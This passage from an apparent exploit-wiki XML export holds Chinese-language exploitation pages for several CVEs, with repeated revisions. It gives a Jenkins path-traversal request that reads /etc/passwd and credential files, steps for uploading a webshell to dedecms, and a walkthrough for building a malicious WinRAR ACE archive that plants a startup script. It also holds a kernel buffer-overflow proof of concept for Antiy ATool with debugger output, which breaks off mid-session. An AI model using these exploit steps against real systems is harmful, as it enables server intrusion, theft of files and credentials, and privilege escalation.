Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>t5rk1mzarb6brde9v5yv4ncir1vaagw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1999002 任意文件讀取漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2879</id>
    <revision>
      <id>3380</id>
      <timestamp>2021-05-26T13:22:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2018-1999002 任意文件讀取漏洞"</comment>
      <origin>3380</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1280" sha1="5meip9frwjd3p6s95wty89tbhg1orqw" xml:space="preserve">&lt;languages   /&gt;

==影響版本==
Jenkins weekly 2.132 以及更早的版本
Jenkins LTS 2.121.1 以及更早的版本

可以讀取Windows系統服務器中的任意文件，且在特定而條件下也可以讀取Linux系統服務器中的文件.

==漏洞利用==
需要已經開啟了匿名用戶讀取權限，在請求頭中添加：
&lt;pre&gt;
Accept-Language: /../../../../../../../../etc/passwd
&lt;/pre&gt;

處理請求中的包含路徑，比如/plugin/xxxx，可以嘗試:

&lt;pre&gt;
/plugin/jquery-detached/.xml
/plugin/jquery-detached/.key
/plugin/credentials/.ini
&lt;/pre&gt;

Windows:
&lt;pre&gt;
GET /plugin/credentials/.ini HTTP/1.1
Host: x.x.x.x:8080
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.7
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Origin: http://x.x.x.x:8080
Referer: http://x.x.x.x:8080/
Accept-Encoding: gzip, deflate
Accept-Language: /../../../../../../../../etc/passwd
Cookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971
Connection: close
&lt;/pre&gt;</text>
      <sha1>5meip9frwjd3p6s95wty89tbhg1orqw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20129 dedecmsV5.7 SP2 前台文件上傳漏洞</title>
    <ns>0</ns>
    <id>1138</id>
    <revision>
      <id>1425</id>
      <timestamp>2021-04-10T02:46:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 登錄並進入 &lt;code&gt;member/article\_add.php&lt;/code&gt; 發布文章，選擇下面的富文本編輯器插..."</comment>
      <origin>1425</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="573" sha1="nn5z1yzkjt2tftdm8xecb4gordedipx" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
登錄並進入 &lt;code&gt;member/article\_add.php&lt;/code&gt; 發布文章，選擇下面的富文本編輯器插入圖片
&lt;/translate&gt;

[[File:Af04d86a30794181263cad493b759731.png |700px]]

&lt;translate&gt;
選擇webshel​​l文件並上傳抓包
&lt;/translate&gt;

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

&lt;translate&gt;
修改文件名與content-type，即可返回 webshel​​l 地址
&lt;/translate&gt;

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>nn5z1yzkjt2tftdm8xecb4gordedipx</sha1>
    </revision>
    <revision>
      <id>1426</id>
      <parentid>1425</parentid>
      <timestamp>2021-04-10T02:46:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1426</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="617" sha1="kqjtysvhidw9l8df5q8djjvn5dk77aw" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
登錄並進入 &lt;code&gt;member/article\_add.php&lt;/code&gt; 發布文章，選擇下面的富文本編輯器插入圖片
&lt;/translate&gt;

[[File:Af04d86a30794181263cad493b759731.png |700px]]

&lt;translate&gt;
&lt;!--T:3--&gt;
選擇webshel​​l文件並上傳抓包
&lt;/translate&gt;

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

&lt;translate&gt;
&lt;!--T:4--&gt;
修改文件名與content-type，即可返回 webshel​​l 地址
&lt;/translate&gt;

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>kqjtysvhidw9l8df5q8djjvn5dk77aw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20129 dedecmsV5.7 SP2 前台文件上傳漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6164</id>
    <revision>
      <id>7048</id>
      <timestamp>2021-07-12T07:12:46Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "CVE-2018-20129 dedecmsV5.7 SP2 前台文件上传漏洞"</comment>
      <origin>7048</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="656" sha1="kkxvlinij0fw3t3k68q1pres679rzw5" xml:space="preserve">&lt;languages /&gt;
==漏洞利用==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
登錄並進入 &lt;code&gt;member/article\_add.php&lt;/code&gt; 發布文章，選擇下面的富文本編輯器插入圖片
&lt;/div&gt;

[[File:Af04d86a30794181263cad493b759731.png |700px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
選擇webshel​​l文件並上傳抓包
&lt;/div&gt;

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
修改文件名與content-type，即可返回 webshel​​l 地址
&lt;/div&gt;

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>kkxvlinij0fw3t3k68q1pres679rzw5</sha1>
    </revision>
    <revision>
      <id>7050</id>
      <parentid>7048</parentid>
      <timestamp>2021-07-12T07:14:09Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "登录并进入&lt;code&gt;member/article\_add.php&lt;/code&gt;发布文章，选择下面的富文本编辑器插入图片"</comment>
      <origin>7050</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="593" sha1="6be0rmqpiiouvvk7zjsml3w6f06v40n" xml:space="preserve">&lt;languages /&gt;
==漏洞利用==

登录并进入&lt;code&gt;member/article\_add.php&lt;/code&gt;发布文章，选择下面的富文本编辑器插入图片

[[File:Af04d86a30794181263cad493b759731.png |700px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
選擇webshel​​l文件並上傳抓包
&lt;/div&gt;

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
修改文件名與content-type，即可返回 webshel​​l 地址
&lt;/div&gt;

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>6be0rmqpiiouvvk7zjsml3w6f06v40n</sha1>
    </revision>
    <revision>
      <id>7052</id>
      <parentid>7050</parentid>
      <timestamp>2021-07-12T07:14:21Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "选择webshell文件并上传抓包"</comment>
      <origin>7052</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="526" sha1="m7aic1metajqtzuu3ebivi7wew1yp4d" xml:space="preserve">&lt;languages /&gt;
==漏洞利用==

登录并进入&lt;code&gt;member/article\_add.php&lt;/code&gt;发布文章，选择下面的富文本编辑器插入图片

[[File:Af04d86a30794181263cad493b759731.png |700px]]

选择webshell文件并上传抓包

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
修改文件名與content-type，即可返回 webshel​​l 地址
&lt;/div&gt;

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>m7aic1metajqtzuu3ebivi7wew1yp4d</sha1>
    </revision>
    <revision>
      <id>7054</id>
      <parentid>7052</parentid>
      <timestamp>2021-07-12T07:14:51Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "修改文件名为content-type，即可返回webshell地址"</comment>
      <origin>7054</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="457" sha1="fqwkt2zmpl0om280tpqsqxnpyb7v39q" xml:space="preserve">&lt;languages /&gt;
==漏洞利用==

登录并进入&lt;code&gt;member/article\_add.php&lt;/code&gt;发布文章，选择下面的富文本编辑器插入图片

[[File:Af04d86a30794181263cad493b759731.png |700px]]

选择webshell文件并上传抓包

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

修改文件名为content-type，即可返回webshell地址

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>fqwkt2zmpl0om280tpqsqxnpyb7v39q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20129 dedecmsV5.7 SP2 前台文件上傳漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3070</id>
    <revision>
      <id>3571</id>
      <timestamp>2021-05-26T13:47:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>3571</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="473" sha1="9jqu95w0wiwt0e7d4j4dglovhve7zao" xml:space="preserve">&lt;languages /&gt;
==漏洞利用==

登錄並進入 &lt;code&gt;member/article\_add.php&lt;/code&gt; 發布文章，選擇下面的富文本編輯器插入圖片

[[File:Af04d86a30794181263cad493b759731.png |700px]]

選擇webshel​​l文件並上傳抓包

[[File:189e02e32f8fc9c11570e03236594d1a.png |700px]]

[[File:E3fef918b39b14960583f1d4e0fcb8c0.png |700px]]

修改文件名與content-type，即可返回 webshel​​l 地址

[[File:3c7c9ec6b57528d6d3171b7153b5445b.png |700px]]</text>
      <sha1>9jqu95w0wiwt0e7d4j4dglovhve7zao</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20250 WinRAR目錄穿越漏洞</title>
    <ns>0</ns>
    <id>1589</id>
    <revision>
      <id>1985</id>
      <timestamp>2021-05-01T01:51:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞原理== 該漏洞是由於WinRAR 所使用的一個陳舊的動態鏈接庫UNACEV2.dll所造成的，該動態鏈接庫在2006 年被編譯，沒有任何的基礎保..."</comment>
      <origin>1985</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3556" sha1="pxu2m1vmzbv6irp6xcz2558ocelvf17" xml:space="preserve">==漏洞原理==
該漏洞是由於WinRAR 所使用的一個陳舊的動態鏈接庫UNACEV2.dll所造成的，該動態鏈接庫在2006 年被編譯，沒有任何的基礎保護機制(ASLR,DEP 等)。該動態鏈接庫的作用是處理ACE 格式文件。而在解壓處理過程中存在一處目錄穿越漏洞,允許解壓過程寫入文件至開機啟動項，導致代碼執行。

==漏洞影響==
&lt;pre&gt;
WinRAR &lt; 5.70 Beta 1

Bandizip &lt; = 6.2.0.0

好壓(2345壓縮) &lt; = 5.9.8.10907

360壓縮 &lt; = 4.0.0.1170
&lt;/pre&gt;

==利用條件==
攻擊不能跨盤符，即受害者進行解壓文件觸發漏洞時，必須在系統盤，且在不知道計算機主機名的情況下，只能在主瀏覽器的默認下載路徑下（C:\Users\Administrator \Downloads）或者桌面進行解壓，或者多猜幾個啟動項路徑。產生漏洞的DLL文件：UNACEV2.DLL，不能識別相對路徑，文件名部分必須為絕對路徑。

以下是幾種機器的開機啟動項路徑，可以看到在個人PC上受用戶名影響，無法猜測到準確的路徑，而服務器上一般不會修改用戶名，所以這個漏洞在服務器上利用度比較高。


==漏洞利用==
這裡我們寫一個bat，進行彈窗演示：

[[File:1266243-20190308101249378-2013483925.png |600px]]

然後打開WinAce，選中我們創建的文件，右鍵，點擊Add to...

[[File:1266243-20190308124414993-1147235497.png |600px]]

利用WinACE進行壓縮,這裡選擇store full path

[[File:1266243-20190308144027681-585501340.png |600px]]

生成之後我們利用腳本檢查一下我們生成的文件1.ace的header信息：

[[File:1266243-20190308133050691-1223667359.png |600px]]

這裡幾個是我們需要修改的參數。

在010Edit工具中打開剛才生成的1.ace文件，將文件路徑替換為啟動項路徑如下，然後可以看到新的完整的文件路徑長度為93，轉換為16進制後為：5D。

[[File:1266243-20190310222141566-376777695.png |600px]]

修改完这两个地方之后点击保存，接着还需要修改hdr_size

[[File:1266243-20190310222410019-46466160.png |600px]]

[[File:1266243-20190310222513809-688780836.png |600px]]

這三個地方修改完成之後點擊保存。

最後利用acefile.py重新查看文件header信息。修改acefile.py，在3061行處添加以下語句，輸出文件hdr_crc。

[[File:1266243-20190308150606052-328146804.png |600px]]

&lt;pre&gt;
print("[+] right_hdr_crc : {} | struct {} ".format(hex(ace_crc16(buf)),struct.pack('&lt;H', ace_crc16(buf))))
print("[*] current_hdr_crc : {} | struct {}".format(hex(hcrc),struct.pack('&lt;H', hcrc)))
&lt;/pre&gt;

[[File:1266243-20190310222732970-1725311033.png |600px]]

可以看到当前的hdr_crc为：16 9A，我们要把它改为E4 A3，保存之后重新查看文件header信息。


[[File:1266243-20190310222933918-1700514051.png |600px]]


修改完成，將文件另存為1.rar。

[[File:1266243-20190308155112326-854060047.png.png |600px]]

選擇解壓到當前文件夾或解壓到文件夾1都可以，可以看到bat文件成功解壓到開機啟動項裡。

[[File:1266243-20190309111018388-35896760.png |600px]]

重啟電腦查看效果

[[File:1266243-20190309112143784-391653487.png |600px]]

复现成功，自动运行bat文件弹窗。

==EXP&amp;POC==
https://github.com/WyAtu/CVE-2018-20250

https://github.com/QAX-A-Team/CVE-2018-20250


==參考==
https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/</text>
      <sha1>pxu2m1vmzbv6irp6xcz2558ocelvf17</sha1>
    </revision>
    <revision>
      <id>1986</id>
      <parentid>1985</parentid>
      <timestamp>2021-05-01T01:52:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* 漏洞利用 */</comment>
      <origin>1986</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3552" sha1="cb0urr0yenyuxijebudqipd8nok8kzg" xml:space="preserve">==漏洞原理==
該漏洞是由於WinRAR 所使用的一個陳舊的動態鏈接庫UNACEV2.dll所造成的，該動態鏈接庫在2006 年被編譯，沒有任何的基礎保護機制(ASLR,DEP 等)。該動態鏈接庫的作用是處理ACE 格式文件。而在解壓處理過程中存在一處目錄穿越漏洞,允許解壓過程寫入文件至開機啟動項，導致代碼執行。

==漏洞影響==
&lt;pre&gt;
WinRAR &lt; 5.70 Beta 1

Bandizip &lt; = 6.2.0.0

好壓(2345壓縮) &lt; = 5.9.8.10907

360壓縮 &lt; = 4.0.0.1170
&lt;/pre&gt;

==利用條件==
攻擊不能跨盤符，即受害者進行解壓文件觸發漏洞時，必須在系統盤，且在不知道計算機主機名的情況下，只能在主瀏覽器的默認下載路徑下（C:\Users\Administrator \Downloads）或者桌面進行解壓，或者多猜幾個啟動項路徑。產生漏洞的DLL文件：UNACEV2.DLL，不能識別相對路徑，文件名部分必須為絕對路徑。

以下是幾種機器的開機啟動項路徑，可以看到在個人PC上受用戶名影響，無法猜測到準確的路徑，而服務器上一般不會修改用戶名，所以這個漏洞在服務器上利用度比較高。


==漏洞利用==
這裡我們寫一個bat，進行彈窗演示：

[[File:1266243-20190308101249378-2013483925.png |600px]]

然後打開WinAce，選中我們創建的文件，右鍵，點擊Add to...

[[File:1266243-20190308124414993-1147235497.png |600px]]

利用WinACE進行壓縮,這裡選擇store full path

[[File:1266243-20190308144027681-585501340.png |600px]]

生成之後我們利用腳本檢查一下我們生成的文件1.ace的header信息：

[[File:1266243-20190308133050691-1223667359.png |600px]]

這裡幾個是我們需要修改的參數。

在010Edit工具中打開剛才生成的1.ace文件，將文件路徑替換為啟動項路徑如下，然後可以看到新的完整的文件路徑長度為93，轉換為16進制後為：5D。

[[File:1266243-20190310222141566-376777695.png |600px]]

修改完这两个地方之后点击保存，接着还需要修改hdr_size

[[File:1266243-20190310222410019-46466160.png |600px]]

[[File:1266243-20190310222513809-688780836.png |600px]]

這三個地方修改完成之後點擊保存。

最後利用acefile.py重新查看文件header信息。修改acefile.py，在3061行處添加以下語句，輸出文件hdr_crc。

[[File:1266243-20190308150606052-328146804.png |600px]]

&lt;pre&gt;
print("[+] right_hdr_crc : {} | struct {} ".format(hex(ace_crc16(buf)),struct.pack('&lt;H', ace_crc16(buf))))
print("[*] current_hdr_crc : {} | struct {}".format(hex(hcrc),struct.pack('&lt;H', hcrc)))
&lt;/pre&gt;

[[File:1266243-20190310222732970-1725311033.png |600px]]

可以看到当前的hdr_crc为：16 9A，我们要把它改为E4 A3，保存之后重新查看文件header信息。


[[File:1266243-20190310222933918-1700514051.png |600px]]


修改完成，將文件另存為1.rar。

[[File:1266243-20190308155112326-854060047.png |600px]]

選擇解壓到當前文件夾或解壓到文件夾1都可以，可以看到bat文件成功解壓到開機啟動項裡。

[[File:1266243-20190309111018388-35896760.png |600px]]

重啟電腦查看效果

[[File:1266243-20190309112143784-391653487.png |600px]]

复现成功，自动运行bat文件弹窗。

==EXP&amp;POC==
https://github.com/WyAtu/CVE-2018-20250

https://github.com/QAX-A-Team/CVE-2018-20250


==參考==
https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/</text>
      <sha1>cb0urr0yenyuxijebudqipd8nok8kzg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-20331 ATool 1.0.0.22緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>484</id>
    <revision>
      <id>686</id>
      <timestamp>2021-03-27T02:52:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Kernel Pool Buffer Overflow ATool - 1.0.0.22 (0day) # CVE: CVE-2018-20331 # Date: 21-12-2018 # Software Link: http://www.antiy.net/ &lt;http://www...."</comment>
      <origin>686</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10326" sha1="4p5a19brjc4vxetqyel0cnu5q2wn8y6" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Kernel Pool Buffer Overflow ATool - 1.0.0.22 (0day)
# CVE: CVE-2018-20331
# Date: 21-12-2018
# Software Link: http://www.antiy.net/ &lt;http://www.antiy.net/&gt; 
# Exploit Author: Aloyce J. Makalanga
# Contact: https://twitter.com/aloycemjr &lt;https://twitter.com/aloycemjr&gt;
# Vendor Homepage: http://www.antiy.net/ &lt;http://www.antiy.net/&gt; 
# Category: Windows
# Attack Type: local
# Impact:Code execution/Denial of Service/Escalation of Privileges

 
1. Description

&gt; Local attackers can trigger a Kernel Pool Buffer Overflow in
&gt; Antiy AVL ATool
&gt; v1.0.0.22. An attacker must first obtain the ability to execute
&gt; low-privileged code on the target system in order to exploit this
&gt; vulnerability. The specific flaw exists within the processing of IOCTL
&gt; 0x80002004 by the ssdt.sys kernel driver. The bug is
&gt; caused by failure to properly validate the length of the user-supplied
&gt; data. An attacker can
&gt; leverage this vulnerability to execute arbitrary code in the context
&gt; of the kernel, which could lead to privilege escalation. A failed
&gt; exploit could lead to denial of service.


   
2. Proof of Concept
 

0: kd&gt; !drvobj ssdt 2
Driver object (87fe0f38) is for:
 \Driver\ssdt
DriverEntry:   aaa0b99e	ssdt
DriverStartIo: 00000000	
DriverUnload:  aaa0b828	ssdt
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      aaa0b686	ssdt+0x686
[01] IRP_MJ_CREATE_NAMED_PIPE           82b08da3	nt!IopInvalidDeviceRequest
[02] IRP_MJ_CLOSE                       aaa0b686	ssdt+0x686
[03] IRP_MJ_READ                        82b08da3	nt!IopInvalidDeviceRequest
[04] IRP_MJ_WRITE                       82b08da3	nt!IopInvalidDeviceRequest
[05] IRP_MJ_QUERY_INFORMATION           82b08da3	nt!IopInvalidDeviceRequest
[06] IRP_MJ_SET_INFORMATION             82b08da3	nt!IopInvalidDeviceRequest
[07] IRP_MJ_QUERY_EA                    82b08da3	nt!IopInvalidDeviceRequest
[08] IRP_MJ_SET_EA                      82b08da3	nt!IopInvalidDeviceRequest
[09] IRP_MJ_FLUSH_BUFFERS               82b08da3	nt!IopInvalidDeviceRequest
[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    82b08da3	nt!IopInvalidDeviceRequest
[0b] IRP_MJ_SET_VOLUME_INFORMATION      82b08da3	nt!IopInvalidDeviceRequest
[0c] IRP_MJ_DIRECTORY_CONTROL           82b08da3	nt!IopInvalidDeviceRequest
[0d] IRP_MJ_FILE_SYSTEM_CONTROL         82b08da3	nt!IopInvalidDeviceRequest
[0e] IRP_MJ_DEVICE_CONTROL              aaa0b6c8	ssdt+0x6c8 &lt;======================= Dispatch Function
[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     82b08da3	nt!IopInvalidDeviceRequest
[10] IRP_MJ_SHUTDOWN                    82b08da3	nt!IopInvalidDeviceRequest
[11] IRP_MJ_LOCK_CONTROL                82b08da3	nt!IopInvalidDeviceRequest
[12] IRP_MJ_CLEANUP                     82b08da3	nt!IopInvalidDeviceRequest
[13] IRP_MJ_CREATE_MAILSLOT             82b08da3	nt!IopInvalidDeviceRequest
[14] IRP_MJ_QUERY_SECURITY              82b08da3	nt!IopInvalidDeviceRequest
[15] IRP_MJ_SET_SECURITY                82b08da3	nt!IopInvalidDeviceRequest
[16] IRP_MJ_POWER                       82b08da3	nt!IopInvalidDeviceRequest
[17] IRP_MJ_SYSTEM_CONTROL              82b08da3	nt!IopInvalidDeviceRequest
[18] IRP_MJ_DEVICE_CHANGE               82b08da3	nt!IopInvalidDeviceRequest
[19] IRP_MJ_QUERY_QUOTA                 82b08da3	nt!IopInvalidDeviceRequest
[1a] IRP_MJ_SET_QUOTA                   82b08da3	nt!IopInvalidDeviceRequest
[1b] IRP_MJ_PNP                         82b08da3	nt!IopInvalidDeviceRequest

0: kd&gt; bp aaa0b6c8
0: kd&gt; g
Breakpoint 0 hit
ssdt+0x6c8:
aaa0b6c8 8bff            mov     edi,edi
0: kd&gt; dd edi
87d6d238  00800005 86c620c8 00000000 00000000
87d6d248  00000000 00000000 00000000 00000000
87d6d258  00000000 00000000 00000000 00040002
87d6d268  00000000 00000000 00000000 00000000
87d6d278  00000000 00000001 00000000 00040001
87d6d288  00000000 87d6d28c 87d6d28c 00040000
87d6d298  00000000 87d6d29c 87d6d29c 00000000
87d6d2a8  00000000 87d6d2ac 87d6d2ac 00000000
0: kd&gt; u eip L20
ssdt+0x6c8:
aaa0b6c8 8bff            mov     edi,edi
aaa0b6ca 55              push    ebp
aaa0b6cb 8bec            mov     ebp,esp
aaa0b6cd 83ec0c          sub     esp,0Ch
aaa0b6d0 53              push    ebx
aaa0b6d1 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
aaa0b6d4 8b4360          mov     eax,dword ptr [ebx+60h]
aaa0b6d7 56              push    esi
aaa0b6d8 33f6            xor     esi,esi
aaa0b6da 89731c          mov     dword ptr [ebx+1Ch],esi
aaa0b6dd 8b5004          mov     edx,dword ptr [eax+4]
aaa0b6e0 8b4808          mov     ecx,dword ptr [eax+8]
aaa0b6e3 8b400c          mov     eax,dword ptr [eax+0Ch]
aaa0b6e6 3d00200080      cmp     eax,80002000h
aaa0b6eb 57              push    edi
aaa0b6ec 8b7b0c          mov     edi,dword ptr [ebx+0Ch]
aaa0b6ef 8955fc          mov     dword ptr [ebp-4],edx
aaa0b6f2 0f84d7000000    je      ssdt+0x7cf (aaa0b7cf)
aaa0b6f8 3d04200080      cmp     eax,80002004h &lt;======================== Vulnerable IOCTL
aaa0b6fd 7442            je      ssdt+0x741 (aaa0b741)
aaa0b6ff 3d08200080      cmp     eax,80002008h
aaa0b704 7531            jne     ssdt+0x737 (aaa0b737)
aaa0b706 8b37            mov     esi,dword ptr [edi]
aaa0b708 56              push    esi
aaa0b709 68a4b6a0aa      push    offset ssdt+0x6a4 (aaa0b6a4)
aaa0b70e e873fdffff      call    ssdt+0x486 (aaa0b486)
aaa0b713 a10cb5a0aa      mov     eax,dword ptr [ssdt+0x50c (aaa0b50c)]
aaa0b718 3b7008          cmp     esi,dword ptr [eax+8]
aaa0b71b 59              pop     ecx
aaa0b71c 59              pop     ecx
aaa0b71d 7714            ja      ssdt+0x733 (aaa0b733)
aaa0b71f 8b00            mov     eax,dword ptr [eax]
0: kd&gt; u . L40
ssdt+0x6f8:
aaa0b6f8 3d04200080      cmp     eax,80002004h
aaa0b6fd 7442            je      ssdt+0x741 (aaa0b741)
aaa0b6ff 3d08200080      cmp     eax,80002008h
aaa0b704 7531            jne     ssdt+0x737 (aaa0b737)
aaa0b706 8b37            mov     esi,dword ptr [edi]
aaa0b708 56              push    esi
aaa0b709 68a4b6a0aa      push    offset ssdt+0x6a4 (aaa0b6a4)
aaa0b70e e873fdffff      call    ssdt+0x486 (aaa0b486)
aaa0b713 a10cb5a0aa      mov     eax,dword ptr [ssdt+0x50c (aaa0b50c)]
aaa0b718 3b7008          cmp     esi,dword ptr [eax+8]
aaa0b71b 59              pop     ecx
aaa0b71c 59              pop     ecx
aaa0b71d 7714            ja      ssdt+0x733 (aaa0b733)
aaa0b71f 8b00            mov     eax,dword ptr [eax]
aaa0b721 8b04b0          mov     eax,dword ptr [eax+esi*4]
aaa0b724 8907            mov     dword ptr [edi],eax
aaa0b726 8b45fc          mov     eax,dword ptr [ebp-4]
aaa0b729 89431c          mov     dword ptr [ebx+1Ch],eax
aaa0b72c 33f6            xor     esi,esi
aaa0b72e e9ad000000      jmp     ssdt+0x7e0 (aaa0b7e0)
aaa0b733 83631c00        and     dword ptr [ebx+1Ch],0
aaa0b737 be0d0000c0      mov     esi,0C000000Dh
aaa0b73c e99f000000      jmp     ssdt+0x7e0 (aaa0b7e0)
aaa0b741 6844646b20      push    206B6444h     &lt;======================= Pooltag
aaa0b746 c1e902          shr     ecx,2
aaa0b749 52              push    edx
aaa0b74a 8bf1            mov     esi,ecx
aaa0b74c 6a00            push    0        &lt;==================================Pool type
aaa0b74e 

1: kd&gt; u . L20
ssdt+0x782:
aaa0b782 8911            mov     dword ptr [ecx],edx
aaa0b784 83c104          add     ecx,4
aaa0b787 ff4df8          dec     dword ptr [ebp-8]
aaa0b78a 75e5            jne     ssdt+0x771 (aaa0b771)
aaa0b78c 8b75f4          mov     esi,dword ptr [ebp-0Ch]
aaa0b78f 8b0d0cb5a0aa    mov     ecx,dword ptr [ssdt+0x50c (aaa0b50c)]
aaa0b795 3b7108          cmp     esi,dword ptr [ecx+8]
aaa0b798 7316            jae     ssdt+0x7b0 (aaa0b7b0)
aaa0b79a 8bd6            mov     edx,esi
aaa0b79c 8b09            mov     ecx,dword ptr [ecx]
aaa0b79e 8b0c91          mov     ecx,dword ptr [ecx+edx*4]
aaa0b7a1 890c90          mov     dword ptr [eax+edx*4],ecx
aaa0b7a4 8b0d0cb5a0aa    mov     ecx,dword ptr [ssdt+0x50c (aaa0b50c)]
aaa0b7aa 42              inc     edx
aaa0b7ab 3b5108          cmp     edx,dword ptr [ecx+8]
aaa0b7ae 72ec            jb      ssdt+0x79c (aaa0b79c)
aaa0b7b0 8b4dfc          mov     ecx,dword ptr [ebp-4]
aaa0b7b3 8bd1            mov     edx,ecx
aaa0b7b5 c1e902          shr     ecx,2
aaa0b7b8 8bf0            mov     esi,eax
aaa0b7ba f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
aaa0b7bc 8bca            mov     ecx,edx
aaa0b7be 83e103          and     ecx,3
aaa0b7c1 50              push    eax
aaa0b7c2 f3a4            rep movs byte ptr es:[edi],byte ptr [esi] &lt;======================= Vulnerable copy

1: kd&gt; dc edi
